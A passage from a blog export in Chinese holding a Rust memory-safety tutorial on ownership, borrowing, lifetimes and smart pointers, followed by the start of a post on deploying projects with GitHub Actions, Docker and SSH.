  // do something\r\n}// a 和 b 在这里被释放\r\n\r\nlet x = ...\r\nlet y = ...\r\nf(x, y)\r\n// x 和 y 就不能够使用了\r\n```\r\n\r\n上面这个函数的参数直接拿走了数据的所有权，这导致调用完函数之后 `x` 和 `y` 就不能继续使用了，但可能这个函数就只是想“借用”一下某个数据，那么我们可以这样写：\r\n\r\n```rust\r\nfn f(a: &String, b: &String) {\r\n    // do something\r\n}\r\n\r\nfn main() {\r\n    let x = String::from(\"xxx\");\r\n    let y = String::from(\"yyy\");\r\n    f(&x, &y);\r\n    // x 和 y 仍然可以在这里使用\r\n}\r\n```\r\n\r\n`&` 在这里有两个含义，它可以用作类型，表示数据的引用，也可以用作运算符，表示引用数据。\r\n\r\n从 C++ 的角度看，Rust 的引用就相当于是指针。`&` 用作运算符就相当于 C++ 中的取地址运算符，用作类型里面就相当于 C++ 中的指针。\r\n\r\n`&` 产生的引用也叫做不可变引用：\r\n\r\n```rust\r\nlet s = String::from(\"hello world\");\r\nlet r: &String = &s;\r\n(*r) = String::from(\"hello rust\");\r\n```\r\n\r\n![image-20251208141949292](https://api.file.caiwen.work/picture/2025/12/08/image-20251208141949292.png)\r\n\r\nRust 还有一种可变引用：`&mut`。我们可以根据上面的报错提示将代码改写成下面这种：\r\n\r\n```rust\r\nlet s = String::from(\"hello world\");\r\nlet r = &mut s;\r\n(*r) = String::from(\"hello rust\");\r\n```\r\n\r\n但还是报错：\r\n\r\n![image-20251208142144426](https://api.file.caiwen.work/picture/2025/12/08/image-20251208142144426.png)\r\n\r\n这是因为 Rust 中，变量默认是不可变的。如果我们想要可变地借用，那么必须变量本身就是可变的：\r\n\r\n```rust\r\nlet mut s = String::from(\"hello world\");\r\nlet r = &mut s;\r\n(*r) = String::from(\"hello rust\");\r\n```\r\n\r\n#### 2.3.1 解引用\r\n\r\nC++ 中可以解引用，在 Rust 中也可以，我们上面例子就已经看到。需要注意的是解引用会获得其所有权，如果你再把所有权转移出去，就会报错：\r\n\r\n```rust\r\nlet x = String::from(\"xxx\");\r\nlet r = &x;\r\nlet y = *r;\r\n```\r\n\r\n我们明明是借用 `x` 的，后面又通过这个借用尝试获得其所有权，这显然是不行的：\r\n\r\n![image-20251208132748149](https://api.file.caiwen.work/picture/2025/12/08/image-20251208132748149.png)\r\n\r\n他建议你使用 `.clone`。还记得吗，`.clone` 函数的只需要变量的引用即可进行复制：\r\n\r\n![image-20251208133201323](https://api.file.caiwen.work/picture/2025/12/08/image-20251208133201323.png)\r\n\r\n又或者是实现了 Copy trait，这意味着数据可以随便复制，于是解引用就相当于给你复制一份出来。\r\n\r\n如果我解引用不是为了转移所有权，那还是允许的：\r\n\r\n```rust\r\nstruct Point {\r\n    x: i32,\r\n    y: i32,\r\n    s: String,\r\n}\r\nlet p = Point { x: 10, y: 20, s: String::from(\"hello\") };\r\nlet r = &p;\r\nlet s = &(*r).s;\r\n```\r\n\r\n#### 2.3.2 自动引用/解引用\r\n\r\n考虑到在 Rust 中，引用比较常见，所以 `.` 这个东西还有些额外作用。首先他可以自动解引用：\r\n\r\n```rust\r\nstruct Point {\r\n    x: i32,\r\n    y: i32,\r\n    s: String,\r\n}\r\nlet p = Point { x: 10, y: 20, s: String::from(\"hello\") };\r\nlet r = &p;\r\nlet x = r.x;\r\n// ---- 等价于 ----\r\nlet x = (*r).x;\r\n```\r\n\r\nRust 中引用也是一个“实体”，比如上面，`r` 相当于拥有了某个对 `p` 的不可变引用的所有权。我们可以对引用进行引用：\r\n\r\n```rust\r\nlet rr = &r;\r\nlet rrr = &rr;\r\nlet rrrr = &rrr;\r\nlet x = rrrr.x;\r\n// ---- 等价于 ----\r\nlet x = (*(*(*rrrr))).x;\r\n```\r\n\r\n用 `.` 调用函数时，如果需要引用，那么会自动引用：\r\n\r\n```rust\r\nlet s = String::from(\"a b c\");\r\nlet arr = s.split(\" \");\r\n// ---- 等价于 ----\r\nlet arr = (&s).split(\" \");\r\n```\r\n\r\n![image-20251208141309177](https://api.file.caiwen.work/picture/2025/12/08/image-20251208141309177.png)\r\n\r\n又比如：\r\n\r\n```rust\r\nlet mut v = vec![1, 2, 3, 4, 5];\r\nv.sort();\r\n// ---- 等价于 ----\r\n(&mut v).sort()\r\n```\r\n\r\n![image-20251208143332796](https://api.file.caiwen.work/picture/2025/12/08/image-20251208143332796.png)\r\n\r\n#### 2.3.3 引用结构体\r\n\r\n如果要借用某个变量，那么这个变量必须是完整的。\r\n\r\n```rust\r\nstruct S {\r\n    x: String,\r\n    y: String,\r\n}\r\nlet s = S {\r\n    x: String::from(\"long string is long\"),\r\n    y: String::from(\"xyz\"),\r\n};\r\nlet x = s.x; // 此时 s 不再拥有 x 的所有权，s 不再完整\r\nlet r = &s;\r\nlet y = s.y; // 但我可以继续从残缺的 s 中再把 y 取出来\r\n```\r\n\r\n![image-20251208171218039](https://api.file.caiwen.work/picture/2025/12/08/image-20251208171218039.png)\r\n\r\nRust 的这种设计带来了一个好处，我们可以很清楚的从函数的签名中大概知道函数想要做什么。\r\n\r\n- 如果函数要求传递所有权，那么这个函数就表示我想“消耗”掉这个数据，数据被消耗掉之后就不应该被继续使用了。\r\n- 如果函数要求传递不可变引用，那么这个函数就表示我就是想“借用”一下这个数据，而且不会对这个数据进行任何修改。\r\n- 如果函数要求传递可变引用，那么这个函数不仅想“借用”一下这个数据，还会对这个数据进行修改。\r\n\r\n### 2.4 内存安全\r\n\r\n#### 2.4.1 内存泄漏\r\n\r\n妥。\r\n\r\n#### 2.4.2 Sharing Versus Mutation\r\n\r\n当共享和可变之间结合时可能会出问题，因此有一些规则限制引用的使用：\r\n\r\n**引用期间不能够移动**\r\n\r\n```rust\r\nlet v = vec![1, 2, 3, 4];\r\nlet r = &v;\r\nlet aside = v;\r\nr[0];\r\n```\r\n\r\n如果我们借用了某个变量，那么在整个借用期间，这个变量指向的数据不能被移动到别的地方去，不然我们的引用就变成悬垂引用了。\r\n\r\n![image-20251208172152505](https://api.file.caiwen.work/picture/2025/12/08/image-20251208172152505.png)\r\n\r\n这样就可以了，确保移动时不存在其他的引用。注意，尽管我们之前可能一直在说函数结束之后某个变量才会被释放，但是 Rust 的编译器会足够聪明，如果从某个地方开始你就不再使用一个变量了，那么 Rust 会认为这个变量的生命周期就持续到那里。\r\n\r\n```rust\r\n{\r\n    let v = vec![1, 2, 3, 4];\r\n\tlet r = &v;\r\n\tr[0];\r\n\tlet aside = v;\r\n}\r\n```\r\n\r\n而在 C++ 中，我们很可能将某个指针指向的数据释放掉了，但忘了这个事，继续用这个指针。而 Rust 中你想释放内存肯定要有所有权，而引用期间所有权不会发生转移，所以不会出现这种情况。\r\n\r\n又比如：\r\n\r\n```rust\r\nlet mut x = 10;\r\nlet r1 = &mut x;\r\nx += 10; // 处在引用期间，不能够被移动\r\nprintln!(\"{}\", r1);\r\n```\r\n\r\n**不可变引用期间不能够有可变引用**\r\n\r\n从直觉上来说，如果不可变引用期间，我们把数据改变了，但是后面又忘了这个事，可能就容易出 bug（类似于变量默认不可变的设计思想），但有时可能没这么简单：\r\n\r\n```rust\r\nlet mut v = vec![1, 2, 3, 4];\r\nlet r = &v[0];\r\nv.push(5);\r\nprintln!(\"r: {}\", r);\r\n```\r\n\r\n![image-20251208174732360](https://api.file.caiwen.work/picture/2025/12/08/image-20251208174732360.png)\r\n\r\n`.push` 虽然可能看起来只会改变数组最后面的部分，并不会影响到我对 `v[0]` 的引用。但是你注意，`.push` 接受可变引用就意味着他可能改变整个 Vector 的任何部分。一种情况是，如果我们 `push` 时发现 vector 容量不够了，需要扩容，那么我们将会重新再堆上分配一个空间，把数据复制过去，然后再释放掉原来的数据，此时之前对 `v[0]` 的引用就失效了。\r\n\r\nC++ 的 vector 也是类似的。而 C++ 并不会去检查这些，一旦出现这种问题将会非常棘手。\r\n\r\n**可变引用期间不能够有其他引用**\r\n\r\n其中的道理和上面是差不多的。\r\n\r\n```rust\r\nlet mut x = 10;\r\nlet r1 = &mut x;\r\nlet r2 = &x;\r\n(*r1) = 12;\r\n```\r\n\r\n![image-20251208175551838](https://api.file.caiwen.work/picture/2025/12/08/image-20251208175551838.png)\r\n\r\n**更多**\r\n\r\nRust 中，每个数据有且仅有一个拥有其所有权的变量，因此这可以形成一个树形结构：\r\n\r\n![image-20251208180312171](https://api.file.caiwen.work/picture/2025/12/08/image-20251208180312171.png)\r\n\r\n当我们不可变地借用某个变量时，其所拥有的变量（即图中子树部分）是只读的（毕竟你只是借用，甚至还是不可变的借用）。其父节点一直到根节点这条链上的点也都是只读的（否则的话就可以在祖先节点上将数据修改掉，制造出悬垂引用）。\r\n\r\n当我们可变地借用某个变量时，其所拥有的变量是可读可写的,也就是整个子树部分都相当于是进行了一个可变引用。如果直接引用其子节点，Rust 会认为你在可变引用的基础上又进行了一个不可变引用。但你可以通过这个可变引用来引用：\r\n\r\n```rust\r\n#[derive(Debug)]\r\nstruct S {\r\n    x: i32,\r\n    y: i32\r\n}\r\nlet mut s = S { x: 10, y: 20 };\r\nlet t_mut = &mut s;\r\nlet r1 = &s.x;\r\nprintln!(\"{:#?}\", t_mut);\r\n```\r\n\r\n![image-20251208181336379](https://api.file.caiwen.work/picture/2025/12/08/image-20251208181336379.png)\r\n\r\n```rust\r\n#[derive(Debug)]\r\nstruct S {\r\n    x: i32,\r\n    y: i32\r\n}\r\nlet mut s = S { x: 10, y: 20 };\r\nlet t_mut = &mut s;\r\nlet r1 = &t_mut.x;\r\nprintln!(\"{:#?}\", t_mut);\r\n```\r\n\r\n同时，产生可变引用的祖先节点不仅是不能够写，甚至连引用都不行了，因为有可能顺着祖先节点的引用来引用到可变引用部分，此时就违背了可变引用单独存在的规则。\r\n\r\n#### 2.4.3 引用的生命周期\r\n\r\n生命周期就是变量/数据从产生到释放的这个范围。在之前我们看到过，变量的生命周期是从定义到离开变量的作用域的这段时间。通过所有权，我们将栈上数据的生命周期绑定到变量上。通过 Drop trait，我们将堆上数据的生命周期绑定到变量上。现在我们又遇到了引用，引用的生命周期是其保持有效的范围。如果我们引用了某个东西，那么我们需要保证在引用的这段时间，被引用的数据没有被释放：\r\n\r\n```rust\r\n{\r\n    let r;\r\n    {\r\n        let x = 1;\r\n        r = &x;\r\n    }\r\n    assert_eq!(*r, 1);\r\n}\r\n```\r\n\r\n![image-20251208144538892](https://api.file.caiwen.work/picture/2025/12/08/image-20251208144538892.png)\r\n\r\n![image-20251208144713692](https://api.file.caiwen.work/picture/2025/12/08/image-20251208144713692.png)\r\n\r\n蓝色表示 `x` 的生命周期，绿色表示 `r` 的生命周期，我们可以看到，在 `x` 生命周期已经结束，被释放后，`r` 的生命周期还没结束。Rust 会阻止这样的代码通过编译。\r\n\r\n如果我们改成这样就可以了：\r\n\r\n![image-20251208145626337](https://api.file.caiwen.work/picture/2025/12/08/image-20251208145626337.png)\r\n\r\n而我们在 C++ 中很容易写出这样的代码：\r\n\r\n![image-20251208173518262](https://api.file.caiwen.work/picture/2025/12/08/image-20251208173518262.png)\r\n\r\n使用结构体也会有类似的问题：\r\n\r\n```rust\r\nstruct S {\r\n    r: &i32\r\n}\r\nlet s;\r\n{\r\n    let x = 10;\r\n    s = S { r: &x };\r\n}\r\nassert_eq!(*s.r, 10);\r\n```\r\n\r\n![image-20251208153020329](https://api.file.caiwen.work/picture/2025/12/08/image-20251208153020329.png)\r\n\r\nRust 还是发现了这个问题。但是即使我们改成下面这样，不再尝试引用已经被释放掉的变量了，Rust 还是会报错：\r\n\r\n```rust\r\nstruct S {\r\n    r: &i32\r\n}\r\nlet x = 10;\r\n{\r\n    let s;\r\n    s = S { r: &x };\r\n    assert_eq!(*s.r, 10);\r\n}\r\n```\r\n\r\n**手动标注生命周期**\r\n\r\n这是因为 Rust 要求结构体中的引用必须手动标注生命周期。\r\n\r\n```rust\r\nstruct S<'a> { // <> 里写结构体内所有手动标注的生命周期\r\n    r: &'a i32\r\n}\r\n```\r\n\r\n其中 `'a` 中的 `a` 是可以自己命名的，我们一般用 `a`、`b`、`c`... 这样的字母来手动标注。在 Rust 中，生命周期也是数据类型的一部分，起到**约束**的作用。只不过在大多数情况下，Rust 会自动推导生命周期，无需我们手动标注。在结构体中，结构体的生命周期显然取各个引用成员中生命周期最短的那个就好了，但是各个成员之间的生命周期 Rust 无法决定。上面只有一个成员还看不出什么问题来，但如果有多个，比如，对于有两个成员变量：\r\n\r\n写法一\r\n\r\n```rust\r\nstruct S<'a> {\r\n    x: &'a i32,\r\n    y: &'a i32\r\n}\r\n```\r\n\r\n写法二\r\n\r\n```rust\r\nstruct S<'a, 'b> {\r\n    x: &'a i32,\r\n    y: &'b i32\r\n}\r\n```\r\n\r\n有两种写法，并且表示的含义完全不同，Rust 无法确定。这就是为什么你需要手动标注生命周期。\r\n\r\n写法一表示，结构体内的 `x` 和结构体内的 `y` 和结构体本身，三者的生命周期一致。注意，这并不意味着创建结构体的时候必须是两个活得一样长的变量才能够赋值进去。Rust 会自动将 `'a` 推导成带有 `'a` 的成员中较短的生命周期。\r\n\r\n```rust\r\nlet x = 10;\r\nlet r;\r\n{\r\n    let y = 20;\r\n    {\r\n        let s = S { x: &x, y: &y };\r\n        r = s.x;\r\n    }\r\n}\r\nprintln!(\"{}\", r);\r\n```\r\n\r\n理论上来说，上面的代码是不会产生悬垂引用的，Rust 没理由报错，但是还是报错了：\r\n\r\n![image-20251208165848267](https://api.file.caiwen.work/picture/2025/12/08/image-20251208165848267.png)\r\n\r\n这是因为 Rust 会将 `'a` 推导为 `y` 的生命周期。于是结构体中的 `s.x` 的生命周期就和 `y` 相当了，尽管 `x` 的生命周期是比较长的。\r\n\r\n而写法二则不同。写法二则表示 `x` 和 `y` 的生命周期没有关联。这样的话上面的代码就正确了，`s.x` 就会和 `x` 的生命周期一致，`s.y` 就会和 `y` 的生命周期一致，而 `s` 的生命周期会取 `'a` 和 `'b` 中较小的那个，也就是会和 `y` 生命周期一致（尽管实际上 `s` 会先比 `y` 释放掉）。这样即使结构体释放掉了，其中较长生命周期的那个引用还能够接着用。\r\n\r\n又比如：\r\n\r\n```rust\r\nstruct S<'a, 'b> {\r\n    x: &'a i32,\r\n    y: &'b i32,\r\n    z: &'b i32\r\n}\r\n```\r\n\r\n这就表示 `x` 和 `y` 与 `z` 的生命周期没有关联，但是 `y` 和 `z` 生命周期是一样的。也就是比如结构体被实例化为变量 `s`，`y` 生命周期较大而 `z` 较小，当 `s.z` 生命结束，`s.y` 也跟着结束，尽管 `y` 还没结束生命。\r\n\r\n总的来说，给结构体手动标注生命周期相当于对成员之间生命周期关系做出了约束。\r\n\r\n当函数需要返回引用的时候也会遇到这种问题，比如：\r\n\r\n```rust\r\nfn longest(x: &String, y: &String) -> &String {\r\n    if x.len() > y.len() {\r\n        x\r\n    } else {\r\n        y\r\n    }\r\n}\r\nfn main() {\r\n    longest(&String::from(\"hello\"), &String::from(\"world!\"));\r\n}\r\n```\r\n\r\n此时 Rust 不清楚返回值的生命周期是什么，有可能生命周期和 `x` 是一样的，有可能和 `y` 是一样的，有可能取 `x` 和 `y` 中存活最短的那个，也有可能和 `x` 与 `y` 没有关系（生命周期为 `'static`）。此时我们分析一下我们究竟要干什么，我们想要返回两个字符串之间最长的那个的引用，那么我们的返回值的生命周期应该和 `x` 与 `y` 之间较长的那个是一致的。但是我们只有运行的时候才知道 `x` 和 `y` 哪个存活时间更久，而 Rust 作为静态类型语言，需要在编译期间就知道所有类型的情况。我们可以保守一点，令返回值的生命周期为两者之中较小的那个：\r\n\r\n```rust\r\nfn longest<'a>(x: &'a String, y: &'a String) -> &'a String {\r\n    if x.len() > y.len() {\r\n        x\r\n    } else {\r\n        y\r\n    }\r\n}\r\n```\r\n\r\n```rust\r\nfn main() {\r\n    let y = String::from(\"world!\");\r\n    let r;\r\n    {\r\n        let x = String::from(\"hello\");\r\n        r = longest(&x, &y);\r\n    }\r\n    println!(\"The longest string is {}\", r);\r\n}\r\n```\r\n\r\n给函数标注生命周期相当于约束了返回值之间，返回值和参数之间生命周期的关系。\r\n\r\n我们可以设想，在 C++ 中，可能也会有两个指针传入一个函数，然后经过比这个例子复杂多的逻辑处理后返回一个指针，此时我们可能就不好去分析这个指针和原来的参数之间有什么关系，此时就可能出现什么悬垂指针，double free 等各种问题。\r\n\r\n### 2.5 杂项\r\n\r\n#### 2.5.1 String，&String，&str\r\n\r\nString 在内存中的结构不再赘述。但我们需要注意到，String 在栈上就是一个指向其在堆上数据的指针再加了两个额外信息，其实 String 本质上就是一个指针，是一个“胖”指针。\r\n\r\n而对于 `&str` 就纯粹了一些，`&str` 只在栈上有数据，其包含了一个指向字符串首字符的指针还有字符串的长度，因此 `&str` 也是个胖指针，但是 `&str` 并不会像 String 那样通过 Drop trait 将堆上数据和自己的生命周期关联起来。\r\n\r\n`&String` 就更纯粹了，他就是一个完全的指针，本质就是一串数字，指向被引用的 `String` 的栈上数据。他不像 `&str` 那样还包含字符串长度这种额外数据。当然，在 Rust 中他的含义会更多一点，他还表示是一个引用。\r\n\r\n之前我们提到，代码中的字符串字面量是放在 `.rodata` 段上的，所以 Rust 中的字符串字面量的类型应该是 `&str`。`.rodata` 段的内存会一直到程序结束后才被操作系统释放，因此我们说字符串字面量有一种特殊的生命周期：`'static` ，他是最长的生命周期，表示从程序的开始到程序的结束。也就是完整的说，字符串字面量类型为 `&'static str`。\r\n\r\nRust 中，String 有 `.as_str()` 可以将其转化为 `&str` 类型。对于 `&str`，我们也有 `.to_string()` 来将其复制从而得到 String 类型，这是我们用的比较多的。\r\n\r\n考虑到 `&String` 和 `&str` 的主要区别是\r\n\r\n```\r\n&String ---指向---> String 的栈上数据 ---包含---> 指向堆上数据的指针 ---指向---> 堆上数据\r\n&str -----------------------------指向--------------------------------------> 堆上数据\r\n```\r\n\r\n所以其实 `&String` 转 `&str` 是简单的。Rust 实现了前者到后者的隐式数据类型转换（From trait），直观的说就是很多接受 `&str` 类型参数的地方可以传 `&String` 类型。\r\n\r\n#### 2.5.2 智能指针\r\n\r\n我们前面说 `String` 和 `Vec` 可以通过 Drop trait 自动管理其在堆上的数据，因此他两个比较智能，可以算是智能指针。但他俩是针对于字符串和数组这种场景的，如果我也想让我自己的类型的数据也能被这么智能地管理，就需要用真正意义上的智能指针。\r\n\r\n**Box**\r\n\r\n如果我创建了一个结构体，那么其大概是在栈上的：\r\n\r\n```rust\r\nstruct S {\r\n    x: u32,\r\n    y: u32\r\n}\r\nlet s = S { x: 1, y: 2 };\r\n```\r\n\r\n我可以使用 `Box` 这个东西将其搞到堆上面：\r\n\r\n```rust\r\nlet s = Box::new(S { x: 1, y: 2 });\r\n// s 的类型是 Box<S>\r\n(*s).x\r\ns.x\r\n```\r\n\r\n涉及到堆的话我们就要讨论一下内存安全问题。`Box` 会将其包裹的数据放到堆上面，然后 `Box` 本身相当于一个指针，指向堆上的数据。\r\n\r\n```rust\r\n// https://doc.rust-lang.org/src/alloc/boxed.rs.html#231-234\r\npub struct Box<\r\n    T: ?Sized,\r\n    #[unstable(feature = \"allocator_api\", issue = \"32838\")] A: Allocator = Global,\r\n>(Unique<T>, A);\r\n\r\nimpl<T> Box<T> {\r\n    #[cfg(not(no_global_oom_handling))]\r\n    #[inline(always)]\r\n    #[stable(feature = \"rust1\", since = \"1.0.0\")]\r\n    #[must_use]\r\n    #[rustc_diagnostic_item = \"box_new\"]\r\n    #[cfg_attr(miri, track_caller)] // even without panics, this helps for Miri backtraces\r\n    pub fn new(x: T) -> Self {\r\n        return box_new(x);\r\n    }\r\n}\r\n\r\n// https://docs.rs/unique/latest/src/unique/lib.rs.html#47\r\n/// Constructs a `Box<T>` by calling the `exchange_malloc` lang item and moving the argument into\r\n/// the newly allocated memory. This is an intrinsic to avoid unnecessary copies.\r\n///\r\n/// This is the surface syntax for `box <expr>` expressions.\r\n#[rustc_intrinsic]\r\n#[unstable(feature = \"liballoc_internals\", issue = \"none\")]\r\npub fn box_new<T>(x: T) -> Box<T>;\r\n\r\n#[stable(feature = \"rust1\", since = \"1.0.0\")]\r\nunsafe impl<#[may_dangle] T: ?Sized, A: Allocator> Drop for Box<T, A> {\r\n    #[inline]\r\n    fn drop(&mut self) {\r\n        // the T in the Box is dropped by the compiler before the destructor is run\r\n\r\n        let ptr = self.0;\r\n\r\n        unsafe {\r\n            let layout = Layout::for_value_raw(ptr.as_ptr());\r\n            if layout.size() != 0 {\r\n                self.1.deallocate(From::from(ptr.cast()), layout);\r\n            }\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n上面这个例子一眼看去感觉没什么实际意义，无非就是换了个地方放数据。但有这样一种情形需要考虑：\r\n\r\n比如我们想实现一个类似链表的东西：\r\n\r\n```rust\r\nstruct S {\r\n    x: u32,\r\n    y: u32,\r\n    next: Option<S>\r\n}\r\n```\r\n\r\n![image-20251208190224551](https://api.file.caiwen.work/picture/2025/12/08/image-20251208190224551.png)\r\n\r\nRust 要求在编译期间知道每个类型的大小，但是上面这种“自我引用”的类型，会让 Rust 无法计算。我们需要一种固定大小的东西，还能通过这个东西间接访问到数据。那么这个东西就是指针了。然后考虑一下指针大概指向上或是堆上。\r\n\r\n如果我们把数据放到栈上，那么这个指针就相当于是引用，我们可以这么写：\r\n\r\n```rust\r\nstruct S<'a> {\r\n    x: u32,\r\n    y: u32,\r\n    next: Option<&'a S<'a>>\r\n}\r\nlet node = S {\r\n    x: 5,\r\n    y: 6,\r\n    next: None\r\n};\r\nlet root = S {\r\n    x: 1,\r\n    y: 2,\r\n    next: Some(&node)\r\n};\r\n```\r\n\r\n不过这样的话，这里的 `node` 的所有权是在 `root` 的外面的，换句话说就是链表中节点的所有权在链表外，这多少看起来有点不妥，比如我想把一个链表的所有权转移出去，我可能要把所有节点的所有权也跟着一个个转走。而且这后面可能会涉及到生命周期的问题。\r\n\r\n如果把数据放到堆上，就可以使用 `Box` 了：\r\n\r\n```rust\r\nstruct S {\r\n    x: u32,\r\n    y: u32,\r\n    next: Option<Box<S>>\r\n}\r\nlet root = S {\r\n    x: 1,\r\n    y: 2,\r\n    next: Some(Box::new(S {\r\n        x: 3,\r\n        y: 4,\r\n        next: None\r\n    }))\r\n};\r\n```\r\n\r\n这样我们就可以认为链表内节点的所有权都在链表内部，看起来更舒服一点（准确来说我们只是有了 `Box` 的所有权，然后再通过 `Box` 的 Drop trait 将其再与堆上数据关联起来）\r\n\r\n**Rc**\r\n\r\n目前 Rust 的所有权机制使得每个数据只能由一个所有者，这样一个数据的生命周期就比较清晰。但是很多时候一个数据的生命周期是不好说的。比如我有多个结构体都需要引用一个数据，那么这个数据的所有者是不好说的，因为这个数据的生命周期就不好确定，其被释放的最好时机应该是这些结构体都被释放了，也就没人引用这个数据了，那么这个数据就应该被释放了。但是单纯依赖单一所有者机制是不好实现这个东西。\r\n\r\n`Rc` 就帮助我们解决了这一点，其基本原理是引用计数，大概如图所示。\r\n\r\n![image-20251208192002688](https://api.file.caiwen.work/picture/2025/12/08/image-20251208192002688.png)\r\n\r\nTo be continued...\r\n\n","summary":"本文介绍了内存的基本概念、C++中的内存使用与安全，以及Rust如何通过所有权、引用和生命周期等机制确保内存安全，避免内存泄漏和悬垂引用。","key":["易千","rust","内存","内存安全","所有权","生命周期"],"tags":[{"value":"培训文件","color":"info"}],"path":["Rust","Rust与内存安全.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"自动化部署：Action + Docker","id":"cicd","createTime":"2025-11-01T11:18:00.000Z","updateTime":"2025-11-01T11:24:02.767Z","content":"\r\n## 1. 前言\r\n\r\n最近由于成都上游服务器厂商倒闭，服务器数据差点丢了。为了保险起见，我打算改用一个国外的厂商的日本服务器。迁移的过程中突然想到了一些痛点：现在我的博客是 Next.js 写的，之前都是手动部署的，如果博客发生了一些修改，那么就要重新打包，传到服务器上，然后再解压，中间还要确保原来的一些配置文件不动，总之就很麻烦，也在一定程度上打消了开发博客的积极性。而我最近恰好在开发小程序时体验到了 CI/CD 的便利，于是打算也将博客和其他的一些项目进行自动化部署，并写下本文章记录一下。\r\n\r\n我们希望最终要达成的目的是，当我对代码进行更改后，提交到 Github 仓库，然后 Github 上自动运行 Action，对项目进行编译，然后部署到服务器上。这样我们只需要提交代码，部署的事情全部自动完成，不需要再操心了。\r\n\r\n## 2. Action\r\n\r\n### 2.1 概览\r\n\r\nAction 可以在仓库发生特定事件之后执行一系列自动化行为。我们可以使用 Action 来对代码进行检查和构建。考虑到如果我们还要自动部署的话，一般会构建成一个 Docker 镜像。\r\n\r\n在 yaml 文件中，`name` 可以设置这个 Action 的名称：\r\n\r\n```yaml\r\nname: Build and Deploy\r\n```\r\n\r\n我们还可以在 `on` 中设置触发条件：\r\n\r\n- 向 master 分支提交后触发：\r\n\r\n```yaml\r\non:\r\n  push:\r\n    branches:\r\n      - master\r\n```\r\n\r\n- 发布 release 之后触发：\r\n\r\n```yaml\r\non:\r\n  release:\r\n    types: [published]\r\n```\r\n\r\n一个 Action 可以有多个 Job，一个 Job 又包含若干个 Steps。\r\n\r\n```yaml\r\njobs:\r\n\tjob1:\r\n\t\truns-on: ...\r\n\t\tenv:\r\n\t\t\t...\r\n        steps:\r\n        \t...\r\n    job2:\r\n \t\t...\r\n    job3:\r\n    \t...\r\n```\r\n\r\n其中 `runs-on` 指明了这个 Action 要在哪个 Runner 上运行。在 Github 上可以直接设置为 `ubuntu-latest`。\r\n\r\n`env` 可以设置当前 Job 的环境变量。\r\n\r\n`steps` 里填写当前 Job 执行的各种行为。\r\n\r\n注意，Job 之间是隔离的，在一个 Job 里做出的修改不会影响到另一个 Job（可以视为不同 Job 位于不同的容器）\r\n\r\nAction 中可能需要使用变量/密钥，我们可以在仓库中设置。然后使用 `{{secrets.KEY}}` 或是 `{{vars.KEY}}` 这样的形式来在 yaml 中引用。\r\n\r\n### 2.2 直接运行指令\r\n\r\n```yaml\r\n- name: Do Something\r\n  run: |\r\n    ...(这里可以写多行的指令)\r\n```\r\n\r\n### 2.3 Checkout\r\n\r\nJob 默认不会直接拉取当前仓库，需要我们手动使用 `checkout` 这个 action：\r\n\r\n```yaml\r\n- name: Checkout repository\r\n  uses: actions/checkout@v4\r\n```\r\n\r\n由于 Job 之间的隔离，在一个 Job 中 checkout 了，另一个 job 如果需要，还要重新 checkout。\r\n\r\n### 2.4 语言相关\r\n\r\n#### 2.4.1 Node.js\r\n\r\n这里还使用 `yarn` 作为包管理工具：\r\n\r\n```yaml\r\n- name: Setup Node.js\r\n  uses: actions/setup-node@v3\r\n  with:\r\n    node-version: \"22\"\r\n    cache: \"yarn\"\r\n- name: Install dependencies\r\n  run: yarn install --frozen-lockfile\r\n```\r\n\r\n注意，如果只是 `yarn install`，则 yarn 则会根据 `package.json` 来安装依赖。如果使用 `--frozen-lockfile` 参数，则会严格使用 `yarn.lock`。\r\n\r\n#### 2.4.2 Rust\r\n\r\n```yaml\r\n- name: Setup Toolchain\r\n  uses: actions-rust-lang/setup-rust-toolchain@v1\r\n  with:\r\n    toolchain: stable\r\n    target: x86_64-unknown-linux-musl\r\n    components: clippy, rustfmt\r\n    cache-all-crates: \"true\"\r\n```\r\n\r\n这里使用 musl ，具体原因会在后面说。同时别忘了后面 `build` 的时候传入 `--target x86_64-unknown-linux-musl` 参数。\r\n\r\n### 2.5 Docker\r\n\r\n使用 Docker 前可能需要连接到 Registry\r\n\r\n```yaml\r\n- name: Login to Docker Registry\r\n  uses: docker/login-action@v3\r\n  with:\r\n    registry: ${{ vars.DOCKER_SERVER }}\r\n    username: ${{ vars.DOCKER_USERNAME }}\r\n    password: ${{ secrets.DOCKER_PASSWORD }}\r\n```\r\n\r\n然后可以 build 当前的 Dockerfile 并推送到已经连接到的 Registry\r\n\r\n```yaml\r\n- name: Build and Push Docker Image\r\n  uses: docker/build-push-action@v5\r\n  with:\r\n    context: .\r\n    file: Dockerfile\r\n    push: true\r\n    tags: ${{ vars.DOCKER_SERVER }}/镜像名称:镜像版本\r\n```\r\n\r\n### 2.6 SSH 相关\r\n\r\n一般我们使用 ssh 密钥的方式连接到生产环境。设置密钥：\r\n\r\n```yaml\r\n- name: Setup SSH\r\n  uses: shimataro/ssh-key-action@v2\r\n  with:\r\n    key: ${{ secrets.SSH_KEY }}\r\n    known_hosts: unnecessary\r\n```\r\n\r\n而后就可以直接通过命令行连接服务器了：\r\n\r\n```yaml\r\n- name: Deploy\r\n  run: |\r\n    ssh -o StrictHostKeyChecking=no ${{ vars.SSH_USER }}@${{ vars.SSH_HOST }} << 'EOF'\r\n    ...\r\n    EOF\r\n```\r\n\r\n最后的那个 EOF 表示中断 SSH 连接。\r\n\r\n使用 `sshpass` 来上传文件到服务器：\r\n\r\n```yaml\r\n- name: Deploy to Server\r\n  run: |\r\n    apt-get install -y sshpass\r\n    sshpass scp -o StrictHostKeyChecking=no \\\r\n      -P 22 target/x86_64-unknown-linux-musl/release/${{ github.event.repository.name }} \\\r\n      ${{ secrets.SSH_USERNAME }}@${{ secrets.SSH_SERVER }}:${{ vars.DEPLOY_DIR }}/\r\n    EOF\r\n```\r\n\r\n### 2.7 跨 Job 传输文件\r\n\r\n由于 Job 之间的隔离，如果你想把一个 Job 的产物给下一个 Job 接着用的话，需要先上传：\r\n\r\n```yaml\r\n- uses: actions/upload-artifact@v4\r\n  with:\r\n    name: deploy-artifacts\r\n    path: deploy/\r\n```\r\n\r\n然后再在另一个 Job 中下载：\r\n\r\n```yaml\r\n- uses: actions/download-artifact@v4\r\n  with:\r\n    name: deploy-artifacts\r\n    path: deploy/\r\n```\r\n\r\n## 3. Docker\r\n\r\nDocker 